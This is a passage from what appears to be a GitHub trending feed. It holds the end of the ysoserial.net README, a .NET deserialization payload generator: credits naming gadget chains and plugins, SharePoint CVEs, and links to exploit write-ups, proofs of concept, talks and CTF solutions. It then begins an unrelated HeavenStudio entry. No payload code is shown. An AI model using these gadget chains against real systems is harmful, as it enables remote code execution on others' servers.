my-new-feature&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Commit your changes (&lt;code&gt;git commit -am &#39;Add some feature&#39;&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Push to the branch (&lt;code&gt;git push origin my-new-feature&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Create new Pull Request&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Thanks&lt;/h2&gt; &#xA;&lt;p&gt;Special thanks to all contributors:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/olekmirosh&#34;&gt;Oleksandr Mirosh&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/irsdl&#34;&gt;irsdl&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/JarLob&#34;&gt;JarLob&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/DS-Kurt-Boberg&#34;&gt;DS-Kurt-Boberg&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/mwulftange&#34;&gt;mwulftange&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/yallie&#34;&gt;yallie&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/paralax&#34;&gt;paralax&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./ysoserial.exe --credit&#xA;&#xA;ysoserial.net has been originally developed by Alvaro Munoz (@pwntester)&#xA;this tool is being maintained by Soroush Dalili (@irsdl) and Alvaro Munoz (@pwntester) &#xA;&#xA;Credits for available gadgets:&#xA;        ActivitySurrogateDisableTypeCheck&#xA;                [Finders: Nick Landers]&#xA;        ActivitySurrogateSelector&#xA;                [Finders: James Forshaw] [Contributors: Alvaro Munoz, zcgonvh]&#xA;        ActivitySurrogateSelectorFromFile&#xA;                [Finders: James Forshaw] [Contributors: Alvaro Munoz, zcgonvh]&#xA;        AxHostState&#xA;                [Finders: Soroush Dalili]&#xA;        BaseActivationFactory&#xA;                [Finders: Piotr Bazydlo]&#xA;        ClaimsIdentity&#xA;                [Finders: Soroush Dalili]&#xA;        ClaimsPrincipal&#xA;                [Finders: jang]&#xA;        DataSet&#xA;                [Finders: James Forshaw] [Contributors: Soroush Dalili]&#xA;        DataSetOldBehaviour&#xA;                [Finders: Steven Seeley] [Contributors: Soroush Dalili]&#xA;        DataSetOldBehaviourFromFile&#xA;                [Finders: Steven Seeley, Markus Wulftange] [Contributors: Soroush Dalili]&#xA;        DataSetTypeSpoof&#xA;                [Finders: James Forshaw] [Contributors: Soroush Dalili, Markus Wulftange, Jang]&#xA;        GenericPrincipal&#xA;                [Finders: Soroush Dalili]&#xA;        GetterCompilerResults&#xA;                [Finders: Piotr Bazydlo]&#xA;        GetterSecurityException&#xA;                [Finders: Piotr Bazydlo]&#xA;        GetterSettingsPropertyValue&#xA;                [Finders: Piotr Bazydlo]&#xA;        ObjectDataProvider&#xA;                [Finders: Oleksandr Mirosh, Alvaro Munoz] [Contributors: Alvaro Munoz, Soroush Dalili, Dane Evans]&#xA;        ObjRef&#xA;                [Finders: Markus Wulftange]&#xA;        PSObject&#xA;                [Finders: Oleksandr Mirosh, Alvaro Munoz] [Contributors: Alvaro Munoz]&#xA;        ResourceSet&#xA;                [Finders: Soroush Dalili]&#xA;        RolePrincipal&#xA;                [Finders: Soroush Dalili]&#xA;        SessionSecurityToken&#xA;                [Finders: @mufinnnnnnn, Soroush Dalili] [Contributors: Soroush Dalili]&#xA;        SessionViewStateHistoryItem&#xA;                [Finders: Soroush Dalili]&#xA;        TextFormattingRunProperties&#xA;                [Finders: Oleksandr Mirosh and Alvaro Munoz] [Contributors: Oleksandr Mirosh, Soroush Dalili, Piotr Bazydlo]&#xA;        ToolboxItemContainer&#xA;                [Finders: @frycos]&#xA;        TypeConfuseDelegate&#xA;                [Finders: James Forshaw] [Contributors: Alvaro Munoz]&#xA;        TypeConfuseDelegateMono&#xA;                [Finders: James Forshaw] [Contributors: Denis Andzakovic, Soroush Dalili]&#xA;        WindowsClaimsIdentity&#xA;                [Finders: Soroush Dalili]&#xA;        WindowsIdentity&#xA;                [Finders: Levi Broderick] [Contributors: Alvaro Munoz, Soroush Dalili]&#xA;        WindowsPrincipal&#xA;                [Finders: Steven Seeley of Qihoo 360 Vulcan Team] [Contributors: Chris Anastasio]&#xA;        XamlAssemblyLoadFromFile&#xA;                [Finders: Soroush Dalili] [Contributors: russtone]&#xA;        XamlImageInfo&#xA;                [Finders: Piotr Bazydlo]&#xA;&#xA;Credits for available plugins:&#xA;        ActivatorUrl&#xA;                Harrison Neal&#xA;        Altserialization&#xA;                Soroush Dalili&#xA;        ApplicationTrust&#xA;                Soroush Dalili&#xA;        Clipboard&#xA;                Soroush Dalili&#xA;        DotNetNuke&#xA;                discovered by Oleksandr Mirosh and Alvaro Munoz, implemented by Alvaro Munoz, tested by @GlitchWitch&#xA;        GetterCallGadgets&#xA;                Piotr Bazydlo&#xA;        NetNonRceGadgets&#xA;                Piotr Bazydlo&#xA;        Resx&#xA;                Soroush Dalili&#xA;        SessionSecurityTokenHandler&#xA;                Soroush Dalili&#xA;        SharePoint&#xA;                CVE-2018-8421: Soroush Dalili, CVE-2019-0604: Markus Wulftange, CVE-2020-1147: Oleksandr Mirosh, Markus Wulftange, Jonathan Birch, Steven Seeley (write-up)  - implemented by Soroush Dalili&#xA;        ThirdPartyGadgets&#xA;                Piotr Bazydlo&#xA;        TransactionManagerReenlist&#xA;                Soroush Dalili&#xA;        ViewState&#xA;                Soroush Dalili&#xA;&#xA;Various other people have also donated their time and contributed to this project.&#xA;Please see https://github.com/pwntester/ysoserial.net/graphs/contributors to find those who have helped developing more features or have fixed bugs.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Additional Reading&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://speakerdeck.com/pwntester/attacking-net-serialization&#34;&gt;Attacking .NET serialization&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf&#34;&gt;Friday the 13th: JSON Attacks - Slides&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf&#34;&gt;Friday the 13th: JSON Attacks - Whitepaper&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=ZBfBYoK_Wr0&#34;&gt;Friday the 13th: JSON Attacks - Video(demos)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf&#34;&gt;Are you my Type? - Slides&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf&#34;&gt;Are you my Type? - Whitepaper&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://googleprojectzero.blogspot.com.es/2017/04/exploiting-net-managed-dcom.html&#34;&gt;Exploiting .NET Managed DCOM&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/tyranid/ExploitRemotingService&#34;&gt;Exploit Remoting Service &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20190330065542/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/&#34;&gt;Finding and Exploiting .NET Remoting over HTTP using Deserialisation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://codewhitesec.blogspot.com/2022/01/dotnet-remoting-revisited.html&#34;&gt;.NET Remoting Revisited&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html&#34;&gt;Bypassing .NET Serialization Binders&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/thezdi/presentations/raw/main/2023_Hexacon/whitepaper-net-deser.pdf&#34;&gt;Exploiting Hardened .NET Deserialization: New Exploitation Ideas and Abuse of Insecure Serialization - Hexacon 2023 Whitepaper&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;ysoserial.net references in the wild&lt;/h2&gt; &#xA;&lt;h3&gt;Research:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html&#34;&gt;https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20190401191940/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/december/beware-of-deserialisation-in-.net-methods-and-classes-code-execution-via-paste/&#34;&gt;https://web.archive.org/web/20190401191940/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/december/beware-of-deserialisation-in-.net-methods-and-classes-code-execution-via-paste/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20190330065542/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/&#34;&gt;https://web.archive.org/web/20190330065542/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20180903005001/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/august/aspnet-resource-files-resx-and-deserialisation-issues/&#34;&gt;https://web.archive.org/web/20180903005001/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/august/aspnet-resource-files-resx-and-deserialisation-issues/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20191210003556/https://www.nccgroup.trust/uk/our-research/use-of-deserialisation-in-.net-framework-methods-and-classes/&#34;&gt;https://web.archive.org/web/20191210003556/https://www.nccgroup.trust/uk/our-research/use-of-deserialisation-in-.net-framework-methods-and-classes/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282&#34;&gt;https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/&#34;&gt;https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817&#34;&gt;https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://research.nccgroup.com/2019/08/23/getting-shell-with-xamlx-files/&#34;&gt;https://research.nccgroup.com/2019/08/23/getting-shell-with-xamlx-files/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/&#34;&gt;https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mdsec.co.uk/2020/04/introducing-ysoserial-net-april-2020-improvements/&#34;&gt;https://www.mdsec.co.uk/2020/04/introducing-ysoserial-net-april-2020-improvements/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.netspi.com/blog/technical/adversary-simulation/re-animating-activitysurrogateselector/&#34;&gt;https://www.netspi.com/blog/technical/adversary-simulation/re-animating-activitysurrogateselector/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.netwrix.com/2023/04/10/generating-deserialization-payloads-for-messagepack-cs-typeless-mode/&#34;&gt;https://blog.netwrix.com/2023/04/10/generating-deserialization-payloads-for-messagepack-cs-typeless-mode/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Usage:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cert.360.cn/warning/detail?id=e689288863456481733e01b093c986b6&#34;&gt;https://cert.360.cn/warning/detail?id=e689288863456481733e01b093c986b6&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-014/-cyberark-password-vault-web-access-remote-code-execution&#34;&gt;https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-014/-cyberark-password-vault-web-access-remote-code-execution&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://labs.mwrinfosecurity.com/advisories/milestone-xprotect-net-deserialization-vulnerability/&#34;&gt;https://labs.mwrinfosecurity.com/advisories/milestone-xprotect-net-deserialization-vulnerability/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://soroush.secproject.com/blog/2018/12/story-of-two-published-rces-in-sharepoint-workflows/&#34;&gt;https://soroush.secproject.com/blog/2018/12/story-of-two-published-rces-in-sharepoint-workflows/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://srcincite.io/blog/2018/08/31/you-cant-contain-me-analyzing-and-exploiting-an-elevation-of-privilege-in-docker-for-windows.html&#34;&gt;https://srcincite.io/blog/2018/08/31/you-cant-contain-me-analyzing-and-exploiting-an-elevation-of-privilege-in-docker-for-windows.html&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2018/8/14/voicemail-vandalism-getting-remote-code-execution-on-microsoft-exchange-server&#34;&gt;https://www.zerodayinitiative.com/blog/2018/8/14/voicemail-vandalism-getting-remote-code-execution-on-microsoft-exchange-server&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.synacktiv.com/ressources/advisories/Sitecore_CSRF_deserialize_RCE.pdf&#34;&gt;https://www.synacktiv.com/ressources/advisories/Sitecore_CSRF_deserialize_RCE.pdf&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability&#34;&gt;https://www.zerodayinitiative.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2019/10/23/cve-2019-1306-are-you-my-index&#34;&gt;https://www.zerodayinitiative.com/blog/2019/10/23/cve-2019-1306-are-you-my-index&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://labs.withsecure.com/blog/autocad-designing-a-kill-chain/&#34;&gt;https://labs.withsecure.com/blog/autocad-designing-a-kill-chain/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/&#34;&gt;https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-viewing-resource-files-in-net-reflector/&#34;&gt;https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-viewing-resource-files-in-net-reflector/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.devsecurity.eu/en/blog/dnspy-deserialization-vulnerability&#34;&gt;https://blog.devsecurity.eu/en/blog/dnspy-deserialization-vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/&#34;&gt;https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&#34;&gt;https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.thezdi.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters&#34;&gt;https://www.thezdi.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mdsec.co.uk/2020/05/analysis-of-cve-2020-0605-code-execution-using-xps-files-in-net/&#34;&gt;https://www.mdsec.co.uk/2020/05/analysis-of-cve-2020-0605-code-execution-using-xps-files-in-net/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html&#34;&gt;https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://srcincite.io/pocs/cve-2020-16952.py.txt&#34;&gt;https://srcincite.io/pocs/cve-2020-16952.py.txt&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters&#34;&gt;https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.modzero.com/modlog/archives/2020/06/16/mz-20-03_-_new_security_advisory_regarding_vulnerabilities_in__net/index.html&#34;&gt;https://www.modzero.com/modlog/archives/2020/06/16/mz-20-03_-_new_security_advisory_regarding_vulnerabilities_in__net/index.html&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&#34;&gt;https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability&#34;&gt;https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/&#34;&gt;https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://peterjson.medium.com/some-notes-about-microsoft-exchange-deserialization-rce-cve-2021-42321-110d04e8852&#34;&gt;https://peterjson.medium.com/some-notes-about-microsoft-exchange-deserialization-rce-cve-2021-42321-110d04e8852&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mdsec.co.uk/2021/09/nsa-meeting-proposal-for-proxyshell/&#34;&gt;https://www.mdsec.co.uk/2021/09/nsa-meeting-proposal-for-proxyshell/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@frycos/searching-for-deserialization-protection-bypasses-in-microsoft-exchange-cve-2022-21969-bfa38f63a62d&#34;&gt;https://medium.com/@frycos/searching-for-deserialization-protection-bypasses-in-microsoft-exchange-cve-2022-21969-bfa38f63a62d&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint&#34;&gt;https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.assetnote.io/2021/11/02/sitecore-rce/&#34;&gt;https://blog.assetnote.io/2021/11/02/sitecore-rce/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20220619183339/https://starlabs.sg/blog/2022/05/new-wine-in-old-bottle-microsoft-sharepoint-post-auth-deserialization-rce-cve-2022-29108/&#34;&gt;https://web.archive.org/web/20220619183339/https://starlabs.sg/blog/2022/05/new-wine-in-old-bottle-microsoft-sharepoint-post-auth-deserialization-rce-cve-2022-29108/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gmo-cybersecurity.com/blog/net-remoting-english/&#34;&gt;https://gmo-cybersecurity.com/blog/net-remoting-english/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mdsec.co.uk/2022/03/abc-code-execution-for-veeam/&#34;&gt;https://www.mdsec.co.uk/2022/03/abc-code-execution-for-veeam/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mandiant.com/resources/hunting-deserialization-exploits&#34;&gt;https://www.mandiant.com/resources/hunting-deserialization-exploits&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mogwailabs.de/en/blog/2022/01/vulnerability-spotlight-rce-in-ajax.net-professional/&#34;&gt;https://mogwailabs.de/en/blog/2022/01/vulnerability-spotlight-rce-in-ajax.net-professional/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://testbnull.medium.com/some-notes-of-microsoft-exchange-deserialization-rce-cve-2021-42321-f6750243cdcd&#34;&gt;https://testbnull.medium.com/some-notes-of-microsoft-exchange-deserialization-rce-cve-2021-42321-f6750243cdcd&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://testbnull.medium.com/note-nhanh-v%E1%BB%81-binaryformatter-binder-v%C3%A0-cve-2022-23277-6510d469604c&#34;&gt;https://testbnull.medium.com/note-nhanh-v%E1%BB%81-binaryformatter-binder-v%C3%A0-cve-2022-23277-6510d469604c&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2023/9/21/finding-deserialization-bugs-in-the-solarwind-platform&#34;&gt;https://www.zerodayinitiative.com/blog/2023/9/21/finding-deserialization-bugs-in-the-solarwind-platform&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=ZcOZNAmKR0c&amp;amp;feature=youtu.be&#34;&gt;https://www.youtube.com/watch?v=ZcOZNAmKR0c&amp;amp;feature=youtu.be&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Talks:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf&#34;&gt;https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://speakerdeck.com/pwntester/attacking-net-serialization&#34;&gt;https://speakerdeck.com/pwntester/attacking-net-serialization&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://speakerdeck.com/pwntester/dot-net-serialization-detecting-and-defending-vulnerable-endpoints&#34;&gt;https://speakerdeck.com/pwntester/dot-net-serialization-detecting-and-defending-vulnerable-endpoints&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gosecure.github.io/presentations/2018-03-18-confoo_mtl/Security_boot_camp_for_.NET_developers_Confoo_v2.pdf&#34;&gt;https://gosecure.github.io/presentations/2018-03-18-confoo_mtl/Security_boot_camp_for_.NET_developers_Confoo_v2.pdf&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://illuminopi.com/assets/files/BSidesIowa_RCEvil.net_20190420.pdf&#34;&gt;https://illuminopi.com/assets/files/BSidesIowa_RCEvil.net_20190420.pdf&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nullcon.net/website/archives/pdf/goa-2018/rohit-slides.pdf&#34;&gt;https://nullcon.net/website/archives/pdf/goa-2018/rohit-slides.pdf&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Tools:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/pwntester/ViewStatePayloadGenerator&#34;&gt;https://github.com/pwntester/ViewStatePayloadGenerator&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/0xACB/viewgen&#34;&gt;https://github.com/0xACB/viewgen&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Illuminopi/RCEvil.NET&#34;&gt;https://github.com/Illuminopi/RCEvil.NET&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;CTF write-ups:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cyku.tw/ctf-hitcon-2018-why-so-serials/&#34;&gt;https://cyku.tw/ctf-hitcon-2018-why-so-serials/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://xz.aliyun.com/t/3019&#34;&gt;https://xz.aliyun.com/t/3019&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>RHeavenStudio/HeavenStudio</title>
    <updated>2024-02-04T01:47:26Z</updated>
    <id>tag:github.com,2024-02-04:/RHeavenStudio/HeavenStudio</id>
    <link href="https://github.com/RHeavenStudio/HeavenStudio" rel="alternate"></link>
    <summary type="html">&lt;p&gt;(WIP) A tool to create playable Rhythm Heaven custom remixes, with many customization options.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Heaven Studio&lt;/h1&gt; &#xA;&lt;p&gt;(WIP) A tool to create playable Rhythm Heaven custom remixes, with many customization options.&lt;/p&gt; &#xA;&lt;p&gt; &lt;a href=&#34;https://discord.gg/2kdZ8kFyEN&#34;&gt; &lt;img src=&#34;https://img.shields.io/discord/945450048832040980?color=5865F2&amp;amp;label=Heaven%20Studio&amp;amp;logo=discord&amp;amp;logoColor=white&#34; alt=&#34;Discord&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.gnu.org/licenses/gpl-3.0&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/License-GPLv3-blue.svg?sanitize=true&#34; alt=&#34;License: GPL v3&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://rheavenstudio.itch.io/heaven-studio&#34;&gt;itch.io Page&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://rheavenstudio.github.io/&#34;&gt;Documentation&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/RHeavenStudio/HeavenStudio/assets/43734252/c32ef9a3-2fd1-40df-b088-968950b2adab&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Prebuilt Binaries&lt;/h2&gt; &#xA;&lt;p&gt;Full releases are published on our &lt;a 